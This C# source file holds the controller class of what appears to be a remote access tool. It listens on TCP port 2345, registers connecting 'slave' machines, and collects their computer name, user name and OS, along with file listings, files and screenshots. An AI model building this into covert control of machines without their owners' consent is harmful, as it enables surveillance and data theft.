using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Controller.Network.Packets;
using Controller.Network.TCP;

namespace Controller
{
    internal class Commander
    {
        private readonly Dictionary<IntPtr, Slave> _slaves; 
        private readonly Server _server;

        public event EventHandler<SlaveEventArgs> SlaveConnected = delegate { };
        public event EventHandler<SlaveEventArgs> SlaveDisconnected = delegate { };

        public Commander()
        {
            _slaves = new Dictionary<IntPtr, Slave>();

            _server = new Server(2345);
            _server.ClientConnected += ClientConnected;
            _server.ClientDisconnected += ClientDisconnected;
        }

        public void Start()
        {
            _server.StartAccept();
        }

        public Slave GetSlave(IntPtr clientHandle)
        {
            Slave slave;
            return _slaves.TryGetValue(clientHandle, out slave) ? slave : null;
        }

        public void DisconnectSlave(IntPtr clientHandle)
        {
            _slaves[clientHandle].Disconnect();
        }

        private void ClientConnected(object sender, ClientEventArgs clientEventArgs)
        {
            var slave = new Slave(clientEventArgs.Client);

            Trace.WriteLine(
                String.Format("[{0}] Connected :D", slave.Client.RemoteEndPoint),
                "Commander.ClientConnected()");

            slave.Client.PacketReceived += PacketReceived;
            slave.Client.PacketSent += PacketSent;
            
            _slaves.Add(slave.Client.ClientHandle, slave);
            slave.Client.SendPacket(new RequestInfoPacket());

            SlaveConnected(this, new SlaveEventArgs(slave));
            clientEventArgs.Client.ReceivePacketAsync();
        }

        private void ClientDisconnected(object sender, ClientEventArgs clientEventArgs)
        {
            var slave = _slaves[clientEventArgs.Client.ClientHandle];
            _slaves.Remove(clientEventArgs.Client.ClientHandle);

            SlaveDisconnected(this, new SlaveEventArgs(slave));
        }

        private void PacketReceived(object sender, PacketEventArgs packetEventArgs)
        {
            var client = packetEventArgs.Client;
            var slave = _slaves[client.ClientHandle];
            var packet = packetEventArgs.Packet;
            Trace.WriteLine(
                String.Format("[{2}] Received: {0} Size: {1}", packetEventArgs.Packet,
                    Util.GetSIPrefix(packetEventArgs.Packet.Size + Packet.HeaderSize), client.RemoteEndPoint),
                "Commander.PacketReceived()");

            if (packet is SendInfoPacket)
            {
                var sendInfoPacket = (SendInfoPacket) packet;

                slave.UpdateInfo(sendInfoPacket.ComputerName, sendInfoPacket.UserName, sendInfoPacket.OS);
            }
            else if (packet is SendPathContentPacket || packet is SendFilePacket)
            {
                slave.Explorer.PacketReceived(packet);
            }
            else if (packet is AckScreensharePacket || packet is SendScreenshotBlockPacket)
            {
                slave.Desktop.PacketReceived(packet);
            }
            else
            {
                Trace.WriteLine(
                    String.Format("[{2}] Packet was unhandled: {0} Size: {1}", packet, packet.Size + Packet.HeaderSize,
                        client.RemoteEndPoint),
                    "Commander.PacketReceived(");
            }

            packetEventArgs.Client.ReceivePacketAsync();
        }

        private void PacketSent(object sender, PacketEventArgs packetEventArgs)
        {
            Trace.WriteLine(
                String.Format("[{2}] Sent: {0} Size: {1}", packetEventArgs.Packet,
                    Util.GetSIPrefix(packetEventArgs.Packet.Size + Packet.HeaderSize), packetEventArgs.Client.RemoteEndPoint),
                "Commander.PacketSent()");
        }
    }
}